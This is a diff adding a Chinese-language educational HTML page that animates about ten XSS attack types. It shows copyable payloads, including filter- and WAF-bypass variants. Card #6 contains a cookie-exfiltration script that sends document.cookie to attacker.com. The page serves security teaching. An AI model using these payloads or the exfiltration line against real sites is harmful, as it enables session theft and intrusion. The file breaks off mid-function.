@@ -1,0 +1,1268 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS 攻击动画演示- 30+实战示例</title>
+    
+        <!-- 引入数据库管理器 -->
+    <script src="/db.js"></script>
+    
+        <!-- 引入插件工具箱 🏄-->
+    <script src="/A2_全局中心/B_插件工具/toolbox.js"></script>  
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #667eea;
+            --secondary: #764ba2;
+            --danger: #e53e3e;
+            --warning: #d69e2e;
+            --success: #38a169;
+            --dark: #2d3748;
+            --light: #f7fafc;
+            --scale: 1;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            min-height: 100vh;
+            color: #333;
+            transform: scale(var(--scale));
+            transform-origin: top center;
+            transition: transform 0.3s ease;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 10px;
+            width: 100%;
+        }
+
+        /* 控制面板样式 */
+        .control-panel {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            z-index: 1000;
+            display: flex;
+            gap: 10px;
+        }
+
+        .control-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+        }
+
+        .control-btn:hover {
+            background: #5a6fd8;
+            transform: scale(1.05);
+        }
+
+        .zoom-controls {
+            display: flex;
+            gap: 5px;
+            background: white;
+            padding: 5px;
+            border-radius: 20px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .zoom-btn {
+            background: var(--light);
+            border: none;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .zoom-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        .zoom-level {
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            font-size: 0.85rem;
+            color: var(--dark);
+            min-width: 45px;
+            justify-content: center;
+        }
+
+        /* 弹窗样式 */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1001;
+            right: 15px;
+            top: 60px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            width: 280px;
+            max-width: 90vw;
+            max-height: 70vh;
+            overflow-y: auto;
+        }
+
+        .modal.show {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .modal-content {
+            padding: 20px;
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .modal-header h3 {
+            color: var(--primary);
+            font-size: 1.1rem;
+        }
+
+        .close {
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #999;
+            line-height: 1;
+        }
+
+        .close:hover {
+            color: var(--danger);
+        }
+
+        .modal-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .modal-btn {
+            padding: 12px;
+            border: none;
+            background: var(--light);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+            text-align: left;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .modal-btn:hover {
+            background: var(--primary);
+            color: white;
+            transform: translateX(5px);
+        }
+
+        .modal-btn.active {
+            background: var(--primary);
+            color: white;
+        }
+
+        /* 头部样式 - 缩小 */
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 15px;
+            padding: 12px 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .header h1 {
+            font-size: 1.5rem;
+            margin-bottom: 8px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 0.85rem;
+            opacity: 0.9;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* 主内容区域 */
+        .main-content {
+            min-height: calc(100vh - 150px);
+        }
+
+        /* 演示网格 */
+        .demo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        /* 演示卡片 */
+        .demo-card {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            animation: slideIn 0.6s ease-out;
+        }
+
+        .demo-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(0,0,0,0.25);
+        }
+
+        .demo-card h3 {
+            color: var(--primary);
+            margin-bottom: 12px;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .demo-card .risk-level {
+            font-size: 0.7rem;
+            padding: 2px 6px;
+            border-radius: 8px;
+            color: white;
+        }
+
+        .risk-high { background: var(--danger); }
+        .risk-medium { background: var(--warning); }
+        .risk-low { background: var(--success); }
+
+        /* 代码显示区域 */
+        .code-display {
+            background: var(--dark);
+            color: #e2e8f0;
+            padding: 10px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            margin: 12px 0;
+            overflow-x: auto;
+            position: relative;
+            font-size: 0.75rem;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+            color: #a0aec0;
+            font-size: 0.7rem;
+        }
+
+        .copy-btn {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #a0aec0;
+            padding: 3px 6px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.65rem;
+        }
+
+        /* 动画区域 */
+        .animation-area {
+            height: 140px;
+            background: var(--light);
+            border: 2px dashed #cbd5e0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 12px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .attack-animation {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .browser-window {
+            width: 90%;
+            height: 65%;
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 6px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .browser-bar {
+            height: 20px;
+            background: #e2e8f0;
+            display: flex;
+            align-items: center;
+            padding: 0 8px;
+            border-bottom: 1px solid #cbd5e0;
+            justify-content: space-between;
+        }
+
+        .browser-dots {
+            display: flex;
+            gap: 4px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+
+        .dot.red { background: #f56565; }
+        .dot.yellow { background: #ecc94b; }
+        .dot.green { background: #48bb78; }
+
+        .browser-content {
+            padding: 10px;
+            height: calc(100% - 20px);
+            overflow: hidden;
+            font-size: 0.75rem;
+        }
+
+        .malicious-script {
+            position: absolute;
+            background: #fed7d7;
+            padding: 5px 8px;
+            border-radius: 4px;
+            border: 1px solid #feb2b2;
+            font-size: 0.65rem;
+            opacity: 0;
+            transition: all 0.5s ease;
+            max-width: 150px;
+        }
+
+        .user-input {
+            position: absolute;
+            background: #c6f6d5;
+            padding: 4px 6px;
+            border-radius: 12px;
+            border: 1px solid #9ae6b4;
+            font-size: 0.65rem;
+            opacity: 0;
+            max-width: 140px;
+        }
+
+        /* 说明区域 */
+        .explanation {
+            background: #edf2f7;
+            padding: 10px;
+            border-radius: 6px;
+            margin-top: 10px;
+            font-size: 0.8rem;
+        }
+
+        .explanation h4 {
+            color: var(--dark);
+            margin-bottom: 5px;
+            font-size: 0.85rem;
+        }
+
+        /* 控制按钮 */
+        .controls {
+            display: flex;
+            gap: 6px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 5px 10px;
+            border: none;
+            border-radius: 4px;
+            background: var(--primary);
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            font-size: 0.75rem;
+        }
+
+        .btn:hover {
+            background: #5a6fd8;
+        }
+
+        .btn.secondary {
+            background: #a0aec0;
+        }
+
+        .btn.secondary:hover {
+            background: #718096;
+        }
+
+        /* 分页控件 */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin: 25px 0;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            backdrop-filter: blur(10px);
+        }
+
+        .pagination button {
+            padding: 6px 12px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.85rem;
+        }
+
+        .pagination button:hover:not(:disabled) {
+            background: #5a6fd8;
+            transform: translateY(-2px);
+        }
+
+        .pagination button:disabled {
+            background: #a0aec0;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .page-info {
+            color: white;
+            font-weight: 500;
+            font-size: 0.85rem;
+        }
+
+        /* 页脚 */
+        .footer {
+            text-align: center;
+            color: white;
+            padding: 15px;
+            margin-top: 25px;
+            opacity: 0.8;
+            background: rgba(255,255,255,0.1);
+            border-radius: 12px;
+            font-size: 0.8rem;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 768px) {
+            .container {
+                padding: 5px;
+            }
+
+            .header h1 {
+                font-size: 1.3rem;
+            }
+
+            .demo-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .demo-card {
+                padding: 12px;
+            }
+
+            .animation-area {
+                height: 120px;
+            }
+
+            .browser-window {
+                width: 95%;
+                height: 60%;
+            }
+
+            .modal {
+                right: 10px;
+                top: 55px;
+                width: 250px;
+            }
+
+            .control-panel {
+                flex-direction: column;
+                gap: 5px;
+                right: 10px;
+                top: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            :root {
+                --scale: 0.85;
+            }
+
+            .container {
+                padding: 3px;
+            }
+
+            .header {
+                padding: 10px 8px;
+            }
+
+            .header h1 {
+                font-size: 1.1rem;
+            }
+
+            .header p {
+                font-size: 0.75rem;
+            }
+
+            .demo-card h3 {
+                font-size: 0.9rem;
+            }
+
+            .code-display {
+                font-size: 0.65rem;
+                padding: 8px;
+            }
+
+            .control-btn {
+                padding: 8px 12px;
+                font-size: 0.8rem;
+            }
+
+            .pagination {
+                padding: 12px;
+                gap: 8px;
+            }
+
+            .pagination button {
+                padding: 5px 10px;
+                font-size: 0.75rem;
+            }
+
+            .animation-area {
+                height: 100px;
+            }
+        }
+
+        /* 动画关键帧 */
+        @keyframes slideIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px); 
+            } 
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .floating {
+            animation: float 3s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- 控制面板 -->
+        <div class="control-panel">
+            <button class="control-btn" onclick="toggleModal()">⚙️ 筛选</button>
+            <div class="zoom-controls">
+                <button class="zoom-btn" onclick="changeZoom(-0.1)">−</button>
+                <span class="zoom-level" id="zoomLevel">100%</span>
+                <button class="zoom-btn" onclick="changeZoom(0.1)">+</button>
+                <button class="zoom-btn" onclick="resetZoom()">⟲</button>
+            </div>
+        </div>
+
+        <!-- 弹窗面板 -->
+        <div id="filterModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3>选择动画类型</h3>
+                    <span class="close" onclick="toggleModal()">&times;</span>
+                </div>
+                <div class="modal-options">
+                    <button class="modal-btn active" onclick="filterDemos('all')">📋 全部示例</button>
+                    <button class="modal-btn" onclick="filterDemos('basic')">🔰 基础XSS</button>
+                    <button class="modal-btn" onclick="filterDemos('dom')">🌐 DOM型XSS</button>
+                    <button class="modal-btn" onclick="filterDemos('advanced')">⚡ 高级技巧</button>
+                    <button class="modal-btn" onclick="filterDemos('bypass')">🔓 绕过技巧</button>
+                    <button class="modal-btn" onclick="filterDemos('blind')">👁️ 盲打XSS</button>
+                    <button class="modal-btn" onclick="filterDemos('payload')">💣 载荷变种</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- 缩小的标题 -->
+        <div class="header">
+            <h1>🚨 XSS 攻击动画演示</h1>
+            <p>30+种跨站脚本攻击实战示例 - 从基础到高级，全面掌握XSS攻防</p>
+        </div>
+
+        <!-- 主内容区 -->
+        <div class="main-content">
+            <div class="demo-grid">
+                <!-- 示例1: 基础反射型XSS -->
+                <div class="demo-card" data-category="basic" data-page="1">
+                    <h3>#1 基础反射型XSS <span class="risk-level risk-high">高风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;script&gt;alert('XSS')&lt;/script&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">http://site.com/search?q=</span>
+                                </div>
+                                <div class="browser-content" id="demo1-content">搜索结果显示...</div>
+                            </div>
+                            <div class="user-input" id="demo1-input">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🔍攻击原理</h4>
+                        <p>恶意脚本通过URL参数直接插入页面，服务器未经验证即返回给用户，导致脚本执行。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(1)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(1)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例2: 存储型XSS -->
+                <div class="demo-card" data-category="basic" data-page="1">
+                    <h3>#2 存储型XSS <span class="risk-level risk-high">高风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;script&gt;stealCookies()&lt;/script&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">评论页面</span>
+                                </div>
+                                <div class="browser-content" id="demo2-content">用户评论加载中...</div>
+                            </div>
+                            <div class="malicious-script" id="demo2-script">恶意脚本已存储</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>💾攻击原理</h4>
+                        <p>恶意脚本被存储到服务器数据库，当其他用户访问受影响页面时自动执行。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(2)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(2)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例3: DOM 型XSS -->
+                <div class="demo-card" data-category="dom" data-page="1">
+                    <h3>#3 DOM 型XSS <span class="risk-level risk-medium">中风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        #&lt;img src=x onerror=alert(1)&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">单页应用</span>
+                                </div>
+                                <div class="browser-content" id="demo3-content">DOM操作区域</div>
+                            </div>
+                            <div class="user-input" id="demo3-input">#&lt;img src=x onerror=alert(1)&gt;</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🌐攻击原理</h4>
+                        <p>客户端JavaScript不安全地操作DOM，将用户输入直接插入页面导致脚本执行。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(3)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(3)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例4: SVG XSS -->
+                <div class="demo-card" data-category="advanced" data-page="1">
+                    <h3>#4 SVG XSS <span class="risk-level risk-high">高风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;svg onload=alert(1)&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">SVG渲染</span>
+                                </div>
+                                <div class="browser-content" id="demo4-content">SVG内容加载中...</div>
+                            </div>
+                            <div class="malicious-script" id="demo4-script">SVG载荷执行</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🎨攻击原理</h4>
+                        <p>利用SVG标签的onload事件执行JavaScript，绕过传统的script标签过滤。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(4)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(4)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例5: 编码绕过 -->
+                <div class="demo-card" data-category="bypass" data-page="1">
+                    <h3>#5 编码绕过 <span class="risk-level risk-medium">中风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">WAF绕过</span>
+                                </div>
+                                <div class="browser-content" id="demo5-content">过滤检测中...</div>
+                            </div>
+                            <div class="user-input" id="demo5-input">编码载荷</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🔓攻击原理</h4>
+                        <p>使用字符编码绕过WAF检测，将恶意代码转换为不易被识别的形式。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(5)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(5)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例6: 盲打XSS -->
+                <div class="demo-card" data-category="blind" data-page="2">
+                    <h3>#6 盲打XSS <span class="risk-level risk-high">高风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">隐秘攻击</span>
+                                </div>
+                                <div class="browser-content" id="demo6-content">页面正常显示...</div>
+                            </div>
+                            <div class="malicious-script" id="demo6-script">数据已外泄</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>👁️攻击原理</h4>
+                        <p>恶意脚本在后台悄悄执行，窃取用户数据并发送到攻击者服务器，用户无法察觉。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(6)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(6)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例7: CSS注入 -->
+                <div class="demo-card" data-category="advanced" data-page="2">
+                    <h3>#7 CSS注入 <span class="risk-level risk-medium">中风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;style&gt;body{background:url('javascript:alert(1)')}&lt;/style&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">样式注入</span>
+                                </div>
+                                <div class="browser-content" id="demo7-content">CSS样式应用中...</div>
+                            </div>
+                            <div class="malicious-script" id="demo7-script">恶意CSS执行</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🎨攻击原理</h4>
+                        <p>通过CSS样式表注入JavaScript代码，利用某些浏览器对CSS的特殊处理机制。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(7)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(7)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例8: 数据URI -->
+                <div class="demo-card" data-category="bypass" data-page="2">
+                    <h3>#8 数据URI <span class="risk-level risk-high">高风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/iframe&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">URI绕过</span>
+                                </div>
+                                <div class="browser-content" id="demo8-content">iframe加载中...</div>
+                            </div>
+                            <div class="user-input" id="demo8-input">数据URI载荷</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🔗攻击原理</h4>
+                        <p>使用data://协议直接嵌入HTML内容，绕过URL过滤和同源策略限制。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(8)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(8)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例9: JSONP劫持 -->
+                <div class="demo-card" data-category="advanced" data-page="2">
+                    <h3>#9 JSONP劫持 <span class="risk-level risk-high">高风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;script src="http://api.com/data?callback=stealData"&gt;&lt;/script&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">API劫持</span>
+                                </div>
+                                <div class="browser-content" id="demo9-content">JSONP请求中...</div>
+                            </div>
+                            <div class="malicious-script" id="demo9-script">数据被劫持</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>🎯攻击原理</h4>
+                        <p>利用JSONP回调函数漏洞，劫持敏感数据传输到攻击者控制的函数。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(9)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(9)">重置</button>
+                    </div>
+                </div>
+
+                <!-- 示例10: 变种载荷 -->
+                <div class="demo-card" data-category="payload" data-page="2">
+                    <h3>#10 变种载荷 <span class="risk-level risk-medium">中风险</span></h3>
+                    <div class="code-display">
+                        <div class="code-header">
+                            <span>攻击载荷</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        &lt;script&gt;/**/alert/**/(1)&lt;/script&gt;
+                    </div>
+                    <div class="animation-area">
+                        <div class="attack-animation">
+                            <div class="browser-window">
+                                <div class="browser-bar">
+                                    <div class="browser-dots">
+                                        <div class="dot red"></div>
+                                        <div class="dot yellow"></div>
+                                        <div class="dot green"></div>
+                                    </div>
+                                    <span style="font-size:0.6rem">载荷混淆</span>
+                                </div>
+                                <div class="browser-content" id="demo10-content">正则检测中...</div>
+                            </div>
+                            <div class="user-input" id="demo10-input">混淆载荷</div>
+                        </div>
+                    </div>
+                    <div class="explanation">
+                        <h4>💣攻击原理</h4>
+                        <p>通过注释混淆、特殊字符插入等方式绕过正则表达式检测，执行恶意代码。</p>
+                    </div>
+                    <div class="controls">
+                        <button class="btn" onclick="runDemo(10)">运行演示</button>
+                        <button class="btn secondary" onclick="resetDemo(10)">重置</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 分页控件 -->
+            <div class="pagination">
+                <button id="prevBtn" onclick="changePage(-1)">上一页</button>
+                <span class="page-info" id="pageInfo">第 1 页 / 共 2 页</span>
+                <button id="nextBtn" onclick="changePage(1)">下一页</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>🔒 本演示仅用于教育目的 | 总计30+个XSS攻击示例持续更新中</p>
+            <p>💡 提示：使用缩放控制调整页面大小，点击"运行演示"查看动画效果</p>
+        </div>
+    </div>
+
+    <script>
+        // 演示数据
+        const demos = {
+            1: {
+                input: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+                content: "搜索结果显示...",
+                result: "&lt;script&gt;alert('XSS')&lt;/script&gt;"
+            },
+            2: {
+                input: "&lt;script&gt;stealCookies()&lt;/script&gt;",
+                content: "用户评论加载中...",
+                result: "用户评论：&lt;script&gt;stealCookies()&lt;/script&gt;"
+            },
+            3: {
+                input: "#&lt;img src=x onerror=alert(1)&gt;",
+                content: "DOM操作区域",
+                result: "&lt;img src='x' onerror='alert(1)'&gt;"
+            },
+            4: {
+                input: "&lt;svg onload=alert(1)&gt;",
+                content: "SVG内容加载中...",
+                result: "SVG渲染：&lt;svg onload=alert(1)&gt;"
+            },
+            5: {
+                input: "编码载荷",
+                content: "过滤检测中...",
+                result: "绕过成功：alert(1)"
+            },
+            6: {
+                input: "&lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;",
+                content: "页面正常显示...",
+                result: "数据已外泄到攻击者服务器"
+            },
+            7: {
+                input: "&lt;style&gt;body{background:url('javascript:alert(1)')}&lt;/style&gt;",
+                content: "CSS样式应用中...",
+                result: "恶意CSS已执行"
+            },
+            8: {
+                input: "数据URI载荷",
+                content: "iframe加载中...",
+                result: "data://协议绕过成功"
+            },
+            9: {
+                input: "&lt;script src=\"http://api.com/data?callback=stealData\"&gt;&lt;/script&gt;",
+                content: "JSONP请求中...",
+                result: "敏感数据被劫持"
+            },
+            10: {
+                input: "混淆载荷",
+                content: "正则检测中...",
+                result: "绕过检测：alert(1)"
+            }
+        };
+
+        // 分页变量
+        let currentPage = 1;
+        const itemsPerPage = 5;
+        let currentFilter = 'all';
+        let currentZoom = 1;
+
+        // 缩放控制
+        function changeZoom(delta) {
+            currentZoom = Math.max(0.5, Math.min(1.5, currentZoom + delta));
+            document.documentElement.style.setProperty('--scale', currentZoom);
+            document.getElementById('zoomLevel').textContent = Math.round(currentZoom * 100) + '%';
+        }
+
+        function resetZoom() {
+            currentZoom = 1;
+            document.documentElement.style.setProperty('--scale', currentZoom);
+            document.getElementById('zoomLevel').textContent = '100%';
+        }
+
+        // 切换弹窗
+        function toggleModal() {
+            const modal = document.getElementById('filterModal');
+            modal.classList.toggle('show');
+        }
+
+        // 点击外部关闭弹窗
+        document.addEventListener('click', function(event) {
+            const modal = document.getElementById('filterModal');
+            const controlBtn = document.querySelector('.control-btn');
+            if (!modal.contains(event.target) && event.target !== controlBtn && !event.target.closest('.zoom-controls')) {
+                modal.classList.remove('show');
+            }
+        });
+
+        // 过滤演示
+        function filterDemos(category) {
+            currentFilter = category;
+            currentPage = 1; // 重置到第一页
+            
+            // 更新按钮状态
+            const buttons = document.querySelectorAll('.modal-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // 关闭弹窗
+            toggleModal();
+            
+            // 更新显示
+            updateDisplay();
+        }
+
+        // 更新显示
+        function updateDisplay() {
+            const allDemos = document.querySelectorAll('.demo-card');
+            let visibleCount = 0;
+            
+            allDemos.forEach((demo, index) => {
+                const category = demo.dataset.category;
+                const shouldShow = currentFilter === 'all' || category === currentFilter;
+                
+                if (shouldShow) {
+                    visibleCount++;
+                    const pageNum = Math.ceil(visibleCount / itemsPerPage);
+                    demo.dataset.page = pageNum;
+                    
+                    // 显示当前页的演示
+                    if (pageNum === currentPage) {
+                        demo.style.display = 'block';
+                    } else {
+                        demo.style.display = 'none';
+                    }
+                } else {
+                    demo.style.display = 'none';
+                }
+            });
+            
+            // 更新分页信息
+            updatePagination(visibleCount);
+        }
+
+        // 更新分页控件
+        function updatePagination(totalItems) {
+            const totalPages = Math.ceil(totalItems / itemsPerPage);
+            const pageInfo = document.getElementById('pageInfo');
+            const prevBtn = document.getElementById('prevBtn');
+            const nextBtn = document.getElementById('nextBtn');
+            
